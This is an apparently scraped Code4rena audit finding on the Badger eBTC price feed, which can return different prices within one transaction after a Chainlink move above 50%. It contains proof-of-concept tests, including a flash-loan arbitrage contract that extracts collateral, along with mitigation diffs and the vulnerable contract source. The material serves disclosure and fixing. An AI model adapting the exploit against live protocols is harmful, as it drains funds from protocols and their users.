{
  "Title": "[M-01] `fetchPrice` can return different prices in the same transaction",
  "Content": "\n<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/PriceFeed.sol#L341> \n\n<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/PriceFeed.sol#L231>\n\n`PriceFeed.sol:fetchPrice()` can return different prices in the same transaction when Chainlink price changes over 50% and the fallback oracle is not set.\n\nIn the scenario of the fallback oracle not set and the Chainlink oracle working correctly the status is `usingChainlinkFallbackUntrusted`. If the Chainlink price changes over 50%, the condition of line 340 evaluates to true, so the last good price is returned and the status is set to `bothOraclesUntrusted`.\n\n```solidity\n313        // --- CASE 5: Using Chainlink, Fallback is untrusted ---\n314        if (status == Status.usingChainlinkFallbackUntrusted) {\n    (...)\n340            if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {\n341                _changeStatus(Status.bothOraclesUntrusted);\n342                return lastGoodPrice;\n343            }\n```\n\nHowever, if the price is requested again and the Chainlink price still returns a price change over 50% from the previous round, having the status set to `bothOraclesUntrusted` will cause the condition of line 220 to evaluate to true and, given that the fallback oracle is not set and the Chainlink oracle is neither broken nor frozen, the price returned will be the current Chainlink price.\n\n```solidity\n219        // --- CASE 3: Both oracles were untrusted at the last price fetch ---\n220        if (status == Status.bothOraclesUntrusted) {\n221            /*\n222             * If there's no fallback, only use Chainlink\n223             */\n224            if (address(fallbackCaller) == address(0)) {\n225                // If CL has resumed working\n226                if (\n227                    !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&\n228                    !_chainlinkIsFrozen(chainlinkResponse)\n229                ) {\n230                    _changeStatus(Status.usingChainlinkFallbackUntrusted);\n231                    return _storeChainlinkPrice(chainlinkResponse.answer);\n232                }\n233            }\n```\n\n### Impact\n\nA difference in the price returned by `fetchPrice` in the same transaction can be exploited to perform an arbitrage in different ways.\n\nIn the case of an increase of over 50% in the Chainlink price, a user can redeem a CDP with the last good price and then open a new CDP with the current Chainlink price, obtaining a collateral surplus.\n\nIn the case of a decrease over 50%, a user can open a CDP with the last good price and then redeem it with the current Chainlink price, obtaining a collateral surplus.\n\nIn both cases, the collateral surplus is obtained at the expense of the protocol with no risk for the user.\n\n### Proof of Concept\n\n<details>\n\n<summary>PoC 1</summary>\n\nThis PoC shows that `fetchPrice` can return different prices in the same transaction when the Chainlink price changes over 50% and the fallback oracle is not set.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport {IPriceFeed} from \"../contracts/Interfaces/IPriceFeed.sol\";\nimport {PriceFeed} from \"../contracts/PriceFeed.sol\";\nimport {PriceFeedTester} from \"../contracts/TestContracts/PriceFeedTester.sol\";\nimport {MockTellor} from \"../contracts/TestContracts/MockTellor.sol\";\nimport {MockAggregator} from \"../contracts/TestContracts/MockAggregator.sol\";\nimport {eBTCBaseFixture} from \"./BaseFixture.sol\";\nimport {TellorCaller} from \"../contracts/Dependencies/TellorCaller.sol\";\nimport {AggregatorV3Interface} from \"../contracts/Dependencies/AggregatorV3Interface.sol\";\n\ncontract AuditPriceFeedTest is eBTCBaseFixture {\n    address constant STETH_ETH_CL_FEED = 0x86392dC19c0b719886221c78AB11eb8Cf5c52812;\n\n    PriceFeedTester internal priceFeedTester;\n    MockAggregator internal _mockChainLinkEthBTC;\n    MockAggregator internal _mockChainLinkStEthETH;\n    uint80 internal latestRoundId = 321;\n    int256 internal initEthBTCPrice = 7428000;\n    int256 internal initStEthETHPrice = 9999e14;\n    uint256 internal initStEthBTCPrice = 7428e13;\n    address internal authUser;\n\n    function setUp() public override {\n        eBTCBaseFixture.setUp();\n        eBTCBaseFixture.connectCoreContracts();\n        eBTCBaseFixture.connectLQTYContractsToCore();\n\n        // Set current and prev price\n        _mockChainLinkEthBTC = new MockAggregator();\n        _initMockChainLinkFeed(_mockChainLinkEthBTC, latestRoundId, initEthBTCPrice, 8);\n        _mockChainLinkStEthETH = new MockAggregator();\n        _initMockChainLinkFeed(_mockChainLinkStEthETH, latestRoundId, initStEthETHPrice, 18);\n\n        priceFeedTester = new PriceFeedTester(\n            address(0), // fallback oracle not set\n            address(authority),\n            address(_mockChainLinkStEthETH),\n            address(_mockChainLinkEthBTC)\n        );\n        priceFeedTester.setStatus(IPriceFeed.Status.usingChainlinkFallbackUntrusted);\n\n        // Grant permission on price feed\n        authUser = _utils.getNextUserAddress();\n        vm.startPrank(defaultGovernance);\n        authority.setUserRole(authUser, 4, true);\n        authority.setRoleCapability(4, address(priceFeedTester), SET_FALLBACK_CALLER_SIG, true);\n        vm.stopPrank();\n    }\n\n    function _initMockChainLinkFeed(\n        MockAggregator _mockFeed,\n        uint80 _latestRoundId,\n        int256 _price,\n        uint8 _decimal\n    ) internal {\n        _mockFeed.setLatestRoundId(_latestRoundId);\n        _mockFeed.setPrevRoundId(_latestRoundId - 1);\n        _mockFeed.setPrice(_price);\n        _mockFeed.setPrevPrice(_price);\n        _mockFeed.setDecimals(_decimal);\n        _mockFeed.setUpdateTime(block.timestamp);\n    }\n\n    function testPriceChangeOver50PerCent() public {\n        uint256 lastGoodPrice = priceFeedTester.lastGoodPrice();\n\n        // Price change over 50%\n        int256 newEthBTCPrice = (initEthBTCPrice * 2) + 1;\n        _mockChainLinkEthBTC.setPrice(newEthBTCPrice);\n\n        // Get price\n        uint256 newPrice = priceFeedTester.fetchPrice();\n        IPriceFeed.Status status = priceFeedTester.status();\n        assertEq(newPrice, lastGoodPrice); // last good price is used\n        assertEq(uint256(status), 2); // bothOraclesUntrusted\n        \n        // Get price again in the same block (no changes in ChainLink price)\n        newPrice = priceFeedTester.fetchPrice();\n        status = priceFeedTester.status();\n        assertGt(newPrice, lastGoodPrice * 2); // current ChainLink price is used\n        assertEq(uint256(status), 4); // usingChainlinkFallbackUntrusted\n    }\n}\n```\n\n</details>\n\n<details>\n\n<summary>PoC 2</summary>\n\nThis PoC shows how to exploit the vulnerability to perform an arbitrage.\n\n`PriceFeedTestnet.sol` has been edited to simulate the scenario proved in the previous test, where the first call to `fetchPrice` returns the last good price and the second call returns the current Chainlink price.\n\n```diff\n@@ -44,6 +44,12 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {\n         return _price;\n     }\n \n+    bool private isFirstCall = true;\n+\n+    function setIsFirstCall(bool _isFirstCall) external {\n+        isFirstCall = _isFirstCall;\n+    }\n+\n     function fetchPrice() external override returns (uint256) {\n         // Fire an event just like the mainnet version would.\n         // This lets the subgraph rely on events to get the latest price even when developing locally.\n@@ -53,8 +59,13 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {\n                 _price = fallbackResponse.answer;\n             }\n         }\n-        emit LastGoodPriceUpdated(_price);\n-        return _price;\n+\n+        if (isFirstCall) {\n+            isFirstCall = false;\n+            return _price;\n+        } else {\n+            return _price * 2 + 1;\n+        }\n     }\n```\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\n\nimport {eBTCBaseFixture} from \"./BaseFixture.sol\";\nimport {IERC20} from \"../contracts/Dependencies/IERC20.sol\";\nimport {IERC3156FlashLender} from \"../contracts/Interfaces/IERC3156FlashLender.sol\";\nimport {IBorrowerOperations} from \"../contracts/Interfaces/IBorrowerOperations.sol\";\nimport {IERC3156FlashBorrower} from \"../contracts/Interfaces/IERC3156FlashBorrower.sol\";\nimport {ICdpManager} from \"../contracts/Interfaces/ICdpManager.sol\";\nimport {HintHelpers} from \"../contracts/HintHelpers.sol\";\n\ncontract AuditArbitrageTest is eBTCBaseFixture {\n    FlashLoanBorrower internal flashBorrower;\n    uint256 internal initialPrice;\n\n    function setUp() public override {\n        eBTCBaseFixture.setUp();\n        eBTCBaseFixture.connectCoreContracts();\n        eBTCBaseFixture.connectLQTYContractsToCore();\n\n        // Create a CDP to have collateral in the protocol\n        initialPrice = priceFeedMock.getPrice();\n        uint256 _coll = 1_000e18;\n        uint256 _debt = (_coll * initialPrice) / 200e16;\n        dealCollateral(address(this), _coll + cdpManager.LIQUIDATOR_REWARD());\n        collateral.approve(address(borrowerOperations), type(uint256).max);\n        borrowerOperations.openCdp(_debt, bytes32(0), bytes32(0), _coll + cdpManager.LIQUIDATOR_REWARD());\n        // Reset `isFirstCall` to true, as `fetchPrice` is called on `openCdp`\n        priceFeedMock.setIsFirstCall(true);\n\n        // Create flash loan borrower\n        flashBorrower = new FlashLoanBorrower(\n            address(collateral),\n            address(eBTCToken),\n            address(borrowerOperations),\n            address(cdpManager),\n            address(hintHelpers)\n        );\n    }\n\n    function testArbitragePriceChangeOver50PerCent() public {\n        assertEq(collateral.balanceOf(address(flashBorrower)), 0);\n        assertEq(eBTCToken.balanceOf(address(flashBorrower)), 0);\n        assertEq(activePool.getSystemCollShares(), 1_000e18);\n\n        uint256 eBTCBborrowAmount = 10e18;\n        flashBorrower.pwn(eBTCBborrowAmount, initialPrice);\n\n        uint256 minExpectedCollProfit = 40e18;\n        assertGt(collateral.balanceOf(address(flashBorrower)), minExpectedCollProfit);\n        assertLt(collateral.balanceOf(address(flashBorrower)), 1_000e18 - minExpectedCollProfit);\n    }\n}\n\ncontract FlashLoanBorrower {\n    IERC20 public immutable collateral;\n    IERC20 public immutable eBTCToken;\n    IBorrowerOperations public immutable borrowerOperations;\n    ICdpManager public immutable cdpManager;\n    HintHelpers public immutable hintHelpers;\n\n    constructor(\n        address _collateral,\n        address _eBTCToken,\n        address _borrowerOperations,\n        address _cdpManager,\n        address _hintHelpers\n    ) {\n        collateral = IERC20(_collateral);\n        eBTCToken = IERC20(_eBTCToken);\n        borrowerOperations = IBorrowerOperations(_borrowerOperations);\n        cdpManager = ICdpManager(_cdpManager);\n        hintHelpers = HintHelpers(_hintHelpers);\n        collateral.approve(_borrowerOperations, type(uint256).max);\n        eBTCToken.approve(_borrowerOperations, type(uint256).max);\n    }\n\n    function pwn(\n        uint256 amount,\n        uint256 price\n    ) external {\n        IERC3156FlashLender(address(borrowerOperations)).flashLoan(\n            IERC3156FlashBorrower(address(this)),\n            address(eBTCToken),\n            amount,\n            abi.encodePacked(price)\n        );\n    }\n\n    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        uint256 price = abi.decode(data, (uint256));\n\n        // Redeem collateral with `amount` eBTC at last valid price\n        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers\n            .getRedemptionHints(amount, price, 0);\n        cdpManager.redeemCollateral(\n            amount,\n            firstRedemptionHint,\n            firstRedemptionHint,\n            firstRedemptionHint,\n            partialRedemptionHintNICR,\n            0,\n            1e18\n        );\n\n        // Open CDP with redeemed collateral at new price (now we receive more eBTC than `amount`)\n        uint256 coll = collateral.balanceOf(address(this));\n        uint256 newPrice = price * 2 + 1;\n        uint256 debt = ((coll - 2e17 /*LIQUIDATOR_REWARD*/) * newPrice) / 110e16;\n        bytes32 cdpId = borrowerOperations.openCdp(debt, bytes32(0), bytes32(0), coll);\n\n        // Repay surplus eBTC and withdraw its proportional collateral\n        uint256 availableEBTC = eBTCToken.balanceOf(address(this)) - (amount + fee);\n        uint256 collToRedeem = (availableEBTC * 110e16) / newPrice;\n        borrowerOperations.adjustCdp(cdpId, collToRedeem, availableEBTC, false, bytes32(0), bytes32(0));\n\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\n```diff\n            // If Chainlink price has changed by > 50% between two consecutive rounds, compare it to Fallback's price\n-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {\n+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {\n                // If Fallback is broken, both oracles are untrusted, and return last good price\n                // We don't trust CL for now given this large price differential\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.bothOraclesUntrusted);\n                    return lastGoodPrice;\n                }\n\n    (...)\n\n            // If Chainlink is live but deviated >50% from it's previous price and Fallback is still untrusted, switch\n            // to bothOraclesUntrusted and return last good price\n-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {\n+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {\n                _changeStatus(Status.bothOraclesUntrusted);\n                return lastGoodPrice;\n            }\n```\n\n**[Alex the Entreprenerd (Badger) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1818624395):**\n > The pre-requisite to this finding is CL having a 50% Deviation between two rounds.\n> \n> This is extremely unlikely.\n> \n> That said, the logic is incorrect and the finding is a valid gotcha we will fix.\n\n**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1823886407):**\n > I would suggest another fix approach different from above \"Recommended Mitigation\" since it make sense to set the status to `bothOraclesUntrusted` if fallback not set while CL got a big (>50%) reporting deviation between two rounds.\n> \n> Using above \"Recommended Mitigation\" would result in exactly what it is trying to avoid: \"the price returned will be the current Chainlink price\".\n> \n> Since eBTC allows [empty fallback](https://github.com/ebtc-protocol/ebtc/commit/b9f999fb1a63193677be66d110e72ff5cca0bca6) (unlike original Liquity which always assumes the fallback is set) so additional checks are required to be executed around:\n> \n> - function `_bothOraclesLiveAndUnbrokenAndSimilarPrice()`\n> - function `_bothOraclesSimilarPrice()`\n> \n> to distinguish the scenarios when fallback is set (broken/frozen) AND when fallback is not set at all.\n> \n> ```diff\n>      function _bothOraclesLiveAndUnbrokenAndSimilarPrice(\n>         ChainlinkResponse memory _chainlinkResponse,\n>         ChainlinkResponse memory _prevChainlinkResponse,\n>         FallbackResponse memory _fallbackResponse\n>     ) internal view returns (bool) {\n>         // Return false if either oracle is broken or frozen\n>         if (\n> +          (address(fallbackCaller) != address(0) && (_fallbackIsBroken(_fallbackResponse) || _fallbackIsFrozen(_fallbackResponse))) ||\n> -           _fallbackIsBroken(_fallbackResponse) ||\n> -           _fallbackIsFrozen(_fallbackResponse) ||\n>             _chainlinkIsBroken(_chainlinkResponse, _prevChainlinkResponse) ||\n>             _chainlinkIsFrozen(_chainlinkResponse)\n>         ) {\n>             return false;\n>         }\n> \n>         return _bothOraclesSimilarPrice(_chainlinkResponse, _fallbackResponse);\n>     }\n> \n>     \n>     function _bothOraclesSimilarPrice(\n>         ChainlinkResponse memory _chainlinkResponse,\n>         FallbackResponse memory _fallbackResponse\n>     ) internal pure returns (bool) {\n> +       if (address(fallbackCaller) == address(0)){\n> +           return true;\n> +       }       \n>         // Get the relative price difference between the oracles. Use the lower price as the denominator, i.e. the reference for the calculation.\n>         uint256 minPrice = EbtcMath._min(_fallbackResponse.answer, _chainlinkResponse.answer);\n>         ......\n>     }\n> ```\n> \n> And finally, we need to apply some extra guards in the state machine for status `bothOraclesUntrusted` and ensure that the price-similarity comparison between primary & fallback oracle happens **ONLY AFTER** other single-source checks (bad/frozen/max-deviation):\n> \n> ```diff\n>   function fetchPrice() external override returns (uint256) {\n>         ......\n>         // --- CASE 3: Both oracles were untrusted at the last price fetch ---\n>         if (status == Status.bothOraclesUntrusted) {\n>             /*\n>              * If there's no fallback, only use Chainlink\n>              */\n>             if (address(fallbackCaller) == address(0)) {\n>                 // If CL has resumed working\n>                 if (\n>                     !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&\n>                     !_chainlinkIsFrozen(chainlinkResponse)\n> +                   && !_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)\n>                 ) {\n>                     _changeStatus(Status.usingChainlinkFallbackUntrusted);\n>                     return _storeChainlinkPrice(chainlinkResponse.answer);\n>                 }\n> +               else {\n> +                   return lastGoodPrice;\n> +               }\n>             }\n> \n>          ......\n>    }\n> ```\n> \n> The PR for the fix is TBA\n\n**[ronnyx2017 (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1826186823):**\n > If the price oracle will be used for tokens with high volatility, I belive this should be at least a medium risk issue. However, if it's only for BTC and stETH, it's more like a QA under normal rules. The mitigation from the sponsor shows that it's a safety design for price oracle. This fills the gap in the confidence interval of chainlink. I think it can be marked as a med risk, as a defence bypass instead of a price manipulation.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-badger",
  "Code": [
    {
      "filename": "packages/contracts/contracts/PriceFeed.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nimport \"./Interfaces/IPriceFeed.sol\";\nimport \"./Interfaces/IFallbackCaller.sol\";\nimport \"./Dependencies/AggregatorV3Interface.sol\";\nimport \"./Dependencies/BaseMath.sol\";\nimport \"./Dependencies/EbtcMath.sol\";\nimport \"./Dependencies/AuthNoOwner.sol\";\n\n/*\n * PriceFeed for mainnet deployment, it connects to two Chainlink's live feeds, ETH:BTC and\n * stETH:ETH, which are used to aggregate the price feed of stETH:BTC in conjuction.\n * It also allows for a fallback oracle to intervene in case that the primary Chainlink oracle fails.\n *\n * The PriceFeed uses Chainlink as primary oracle and allows for an optional fallback source. It contains logic for\n * switching oracles based on oracle failures, timeouts, and conditions for returning to the primary\n * Chainlink oracle. In addition, it contains the mechanism to add or remove the fallback oracle through governance.\n */\ncontract PriceFeed is BaseMath, IPriceFeed, AuthNoOwner {\n    string public constant NAME = \"PriceFeed\";\n\n    // Chainlink oracles in mainnet\n    AggregatorV3Interface public immutable ETH_BTC_CL_FEED;\n    AggregatorV3Interface public immutable STETH_ETH_CL_FEED;\n\n    // Fallback feed\n    IFallbackCaller public fallbackCaller; // Wrapper contract that calls the fallback system\n\n    // Maximum time period allowed since Chainlink's latest round data timestamp, beyond which Chainlink is considered frozen.\n    uint256 public constant TIMEOUT_ETH_BTC_FEED = 4800; // 1 hours & 20min: 60 * 80\n    uint256 public constant TIMEOUT_STETH_ETH_FEED = 90000; // 25 hours: 60 * 60 * 25\n\n    // Maximum deviation allowed between two consecutive Chainlink oracle prices. 18-digit precision.\n    uint256 public constant MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND = 5e17; // 50%\n\n    /*\n     * The maximum relative price difference between two oracle responses allowed in order for the PriceFeed\n     * to return to using the Chainlink oracle. 18-digit precision.\n     */\n    uint256 public constant MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES = 5e16; // 5%\n\n    // The last good price seen from an oracle by eBTC\n    uint256 public lastGoodPrice;\n\n    // The current status of the PriceFeed, which determines the conditions for the next price fetch attempt\n    Status public status;\n\n    // --- Dependency setters ---\n\n    /// @notice Sets the addresses of the contracts and initializes the system\n    /// @param _fallbackCallerAddress The address of the Fallback oracle contract\n    /// @param _authorityAddress The address of the Authority contract\n    /// @param _collEthCLFeed The address of the collateral-ETH ChainLink feed\n    /// @param _ethBtcCLFeed The address of the ETH-BTC ChainLink feed\n    constructor(\n        address _fallbackCallerAddress,\n        address _authorityAddress,\n        address _collEthCLFeed,\n        address _ethBtcCLFeed\n    ) {\n        fallbackCaller = IFallbackCaller(_fallbackCallerAddress);\n\n        _initializeAuthority(_authorityAddress);\n\n        emit FallbackCallerChanged(address(0), _fallbackCallerAddress);\n\n        ETH_BTC_CL_FEED = AggregatorV3Interface(_ethBtcCLFeed);\n        STETH_ETH_CL_FEED = AggregatorV3Interface(_collEthCLFeed);\n\n        // Get an initial price from Chainlink to serve as first reference for lastGoodPrice\n        ChainlinkResponse memory chainlinkResponse = _getCurrentChainlinkResponse();\n        ChainlinkResponse memory prevChainlinkResponse = _getPrevChainlinkResponse(\n            chainlinkResponse.roundEthBtcId,\n            chainlinkResponse.roundStEthEthId\n        );\n\n        require(\n            !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&\n                !_chainlinkIsFrozen(chainlinkResponse),\n            \"PriceFeed: Chainlink must be working and current\"\n        );\n\n        _storeChainlinkPrice(chainlinkResponse.answer);\n\n        // Explicitly set initial system status after `require` checks\n        status = Status.chainlinkWorking;\n    }\n\n    // --- Functions ---\n\n    /// @notice Returns the latest price obtained from the Oracle\n    /// @dev Called by eBTC functions that require a current price. Also callable permissionlessly.\n    /// @dev Non-view function - it updates and stores the last good price seen by eBTC.\n    /// @dev Uses a main oracle (Chainlink) and a fallback oracle in case Chainlink fails. If both fail, it uses the last good price seen by eBTC.\n    /// @dev The fallback oracle address can be swapped by the Authority. The fallback oracle must conform to the IFallbackCaller interface.\n    function fetchPrice() external override returns (uint256) {\n        // Get current and previous price data from Chainlink, and current price data from Fallback\n        ChainlinkResponse memory chainlinkResponse = _getCurrentChainlinkResponse();\n        ChainlinkResponse memory prevChainlinkResponse = _getPrevChainlinkResponse(\n            chainlinkResponse.roundEthBtcId,\n            chainlinkResponse.roundStEthEthId\n        );\n        FallbackResponse memory fallbackResponse = _getCurrentFallbackResponse();\n\n        // --- CASE 1: System fetched last price from Chainlink  ---\n        if (status == Status.chainlinkWorking) {\n            // If Chainlink is broken, try Fallback\n            if (_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse)) {\n                // If Fallback is broken then both oracles are untrusted, so return the last good price\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.bothOraclesUntrusted);\n                    return lastGoodPrice;\n                }\n                /*\n                 * If Fallback is only frozen but otherwise returning valid data, return the last good price.\n                 * Fallback may need to be tipped to return current data.\n                 */\n                if (_fallbackIsFrozen(fallbackResponse)) {\n                    _changeStatus(Status.usingFallbackChainlinkUntrusted);\n                    return lastGoodPrice;\n                }\n\n                // If Chainlink is broken and Fallback is working, switch to Fallback and return current Fallback price\n                _changeStatus(Status.usingFallbackChainlinkUntrusted);\n                return _storeFallbackPrice(fallbackResponse);\n            }\n\n            // If Chainlink is frozen, try Fallback\n            if (_chainlinkIsFrozen(chainlinkResponse)) {\n                // If Fallback is broken too, remember Fallback broke, and return last good price\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.usingChainlinkFallbackUntrusted);\n                    return lastGoodPrice;\n                }\n\n                // If Fallback is frozen or working, remember Chainlink froze, and switch to Fallback\n                _changeStatus(Status.usingFallbackChainlinkFrozen);\n\n                if (_fallbackIsFrozen(fallbackResponse)) {\n                    return lastGoodPrice;\n                }\n\n                // If Fallback is working, use it\n                return _storeFallbackPrice(fallbackResponse);\n            }\n\n            // If Chainlink price has changed by > 50% between two consecutive rounds, compare it to Fallback's price\n            if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {\n                // If Fallback is broken, both oracles are untrusted, and return last good price\n                // We don't trust CL for now given this large price differential\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.bothOraclesUntrusted);\n                    return lastGoodPrice;\n                }\n\n                // If Fallback is frozen, switch to Fallback and return last good price\n                // We don't trust CL for now given this large price differential\n                if (_fallbackIsFrozen(fallbackResponse)) {\n                    _changeStatus(Status.usingFallbackChainlinkUntrusted);\n                    return lastGoodPrice;\n                }\n\n                /*\n                 * If Fallback is live and both oracles have a similar price, conclude that Chainlink's large price deviation between\n                 * two consecutive rounds was likely a legitmate market price movement, and so continue using Chainlink\n                 */\n                if (_bothOraclesSimilarPrice(chainlinkResponse, fallbackResponse)) {\n                    return _storeChainlinkPrice(chainlinkResponse.answer);\n                }\n\n                // If Fallback is live but the oracles differ too much in price, conclude that Chainlink's initial price deviation was\n                // an oracle failure. Switch to Fallback, and use Fallback price\n                _changeStatus(Status.usingFallbackChainlinkUntrusted);\n                return _storeFallbackPrice(fallbackResponse);\n            }\n\n            // If Chainlink is working and Fallback is broken, remember Fallback is broken\n            if (_fallbackIsBroken(fallbackResponse)) {\n                _changeStatus(Status.usingChainlinkFallbackUntrusted);\n            }\n\n            // If Chainlink is working, return Chainlink current price (no status change)\n            return _storeChainlinkPrice(chainlinkResponse.answer);\n        }\n\n        // --- CASE 2: The system fetched last price from Fallback ---\n        if (status == Status.usingFallbackChainlinkUntrusted) {\n            // If both Fallback and Chainlink are live, unbroken, and reporting similar prices, switch back to Chainlink\n            if (\n                _bothOraclesLiveAndUnbrokenAndSimilarPrice(\n                    chainlinkResponse,\n                    prevChainlinkResponse,\n                    fallbackResponse\n                )\n            ) {\n                _changeStatus(Status.chainlinkWorking);\n                return _storeChainlinkPrice(chainlinkResponse.answer);\n            }\n\n            if (_fallbackIsBroken(fallbackResponse)) {\n                _changeStatus(Status.bothOraclesUntrusted);\n                return lastGoodPrice;\n            }\n\n            /*\n             * If Fallback is only frozen but otherwise returning valid data, just return the last good price.\n             * Fallback may need to be tipped to return current data.\n             */\n            if (_fallbackIsFrozen(fallbackResponse)) {\n                return lastGoodPrice;\n            }\n\n            // Otherwise, use Fallback price\n            return _storeFallbackPrice(fallbackResponse);\n        }\n\n        // --- CASE 3: Both oracles were untrusted at the last price fetch ---\n        if (status == Status.bothOraclesUntrusted) {\n            /*\n             * If there's no fallback, only use Chainlink\n             */\n            if (address(fallbackCaller) == address(0)) {\n                // If CL has resumed working\n                if (\n                    !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&\n                    !_chainlinkIsFrozen(chainlinkResponse)\n                ) {\n                    _changeStatus(Status.usingChainlinkFallbackUntrusted);\n                    return _storeChainlinkPrice(chainlinkResponse.answer);\n                }\n            }\n\n            /*\n             * If both oracles are now live, unbroken and similar price, we assume that they are reporting\n             * accurately, and so we switch back to Chainlink.\n             */\n            if (\n                _bothOraclesLiveAndUnbrokenAndSimilarPrice(\n                    chainlinkResponse,\n                    prevChainlinkResponse,\n                    fallbackResponse\n                )\n            ) {\n                _changeStatus(Status.chainlinkWorking);\n                return _storeChainlinkPrice(chainlinkResponse.answer);\n            }\n\n            // Otherwise, return the last good price - both oracles are still untrusted (no status change)\n            return lastGoodPrice;\n        }\n\n        // --- CASE 4: Using Fallback, and Chainlink is frozen ---\n        if (status == Status.usingFallbackChainlinkFrozen) {\n            if (_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse)) {\n                // If both Oracles are broken, return last good price\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.bothOraclesUntrusted);\n                    return lastGoodPrice;\n                }\n\n                // If Chainlink is broken, remember it and switch to using Fallback\n                _changeStatus(Status.usingFallbackChainlinkUntrusted);\n\n                if (_fallbackIsFrozen(fallbackResponse)) {\n                    return lastGoodPrice;\n                }\n\n                // If Fallback is working, return Fallback current price\n                return _storeFallbackPrice(fallbackResponse);\n            }\n\n            if (_chainlinkIsFrozen(chainlinkResponse)) {\n                // if Chainlink is frozen and Fallback is broken, remember Fallback broke, and return last good price\n                if (_fallbackIsBroken(fallbackResponse)) {\n                    _changeStatus(Status.usingChainlinkFallbackUntrusted);\n                    return lastGoodPrice;\n                }\n\n                // If both are frozen, just use lastGoodPrice\n                if (_fallbackIsFrozen(fallbackResponse)) {\n                    return lastGoodPrice;\n                }\n\n                // if Chainlink is frozen and Fallback is working, keep using Fallback (no status change)\n                return _storeFallbackPrice(fallbackResponse);\n            }\n\n            // if Chainlink is live and Fallback is broken, remember Fallback broke, and return Chainlink price\n            if (_fallbackIsBroken(fallbackResponse)) {\n                _changeStatus(Status.usingChainlinkFallbackUntrusted);\n                return _storeChainlinkPrice(chainlinkResponse.answer);\n            }\n\n            // If Chainlink is live and Fallback is frozen, just use last good price (no status change) since we have no basis for comparison\n            if (_fallbackIsFrozen(fallbackResponse)) {\n                return lastGoodPrice;\n            }\n\n            // If Chainlink is live and Fallback is working, compare prices. Switch to Chainlink\n            // if prices are within 5%, and return Chainlink price.\n            if (_bothOraclesSimilarPrice(chainlinkResponse, fallbackResponse)) {\n                _changeStatus(Status.chainlinkWorking);\n                return _storeChainlinkPrice(chainlinkResponse.answer);\n            }\n\n            // Otherwise if Chainlink is live but price not within 5% of Fallback, distrust Chainlink, and return Fallback price\n            _changeStatus(Status.usingFallbackChainlinkUntrusted);\n            return _storeFallbackPrice(fallbackResponse);\n        }\n\n        // --- CASE 5: Using Chainlink, Fallback is untrusted ---\n        if (status == Status.usingChainlinkFallbackUntrusted) {\n            // If Chainlink breaks, now both oracles are untrusted\n            if (_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse)) {\n                _changeStatus(Status.bothOraclesUntrusted);\n                return lastGoodPrice;\n            }\n\n            // If Chainlink is frozen, return last good price (no status change)\n            if (_chainlinkIsFrozen(chainlinkResponse)) {\n                return lastGoodPrice;\n            }\n\n            // If Chainlink and Fallback are both live, unbroken and similar price, switch back to chainlinkWorking and return Chainlink price\n            if (\n                _bothOraclesLiveAndUnbrokenAndSimilarPrice(\n                    chainlinkResponse,\n                    prevChainlinkResponse,\n                    fallbackResponse\n                )\n            ) {\n                _changeStatus(Status.chainlinkWorking);\n                return _storeChainlinkPrice(chainlinkResponse.answer);\n            }\n\n            // If Chainlink is live but deviated >50% from it's previous price and Fallback is still untrusted, switch\n            // to bothOraclesUntrusted and return last good price\n            if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {\n                _changeStatus(Status.bothOraclesUntrusted);\n                return lastGoodPrice;\n            }\n\n            // Otherwise if Chainlink is live and deviated <50% from it's previous price and Fallback is still untrusted,\n            // return Chainlink price (no status change)\n            return _storeChainlinkPrice(chainlinkResponse.answer);\n        }\n\n        /// @audit This should never be used, but we added it for the Certora Prover\n        return lastGoodPrice;\n    }\n\n    // --- Governance Functions ---\n    /// @notice Sets a new fallback oracle\n    /// @dev Healthy response of new oracle is checked, with extra event emitted on failure\n    /// 